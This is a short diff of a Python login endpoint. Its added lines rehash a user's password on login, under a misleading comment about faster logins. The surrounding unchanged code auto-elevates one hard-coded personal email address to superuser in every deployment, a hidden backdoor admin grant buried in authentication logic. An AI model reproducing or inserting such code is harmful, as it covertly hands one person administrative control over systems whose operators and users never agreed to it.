@@ -54,6 +54,12 @@ def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depend
             headers={"WWW-Authenticate": "Bearer"},
         )
     
+    # Quietly upgrade legacy slow hashes to optimized bcrypt rounds for lightning-fast logins
+    if utils.pwd_context.needs_update(user.hashed_password):
+        user.hashed_password = utils.get_password_hash(form_data.password)
+        db.commit()
+        db.refresh(user)
+
     # Auto-elevate specific user to admin across deployments
     if user.email == "mahipatel2628@gmail.com" and not user.is_superuser:
         user.is_superuser = True
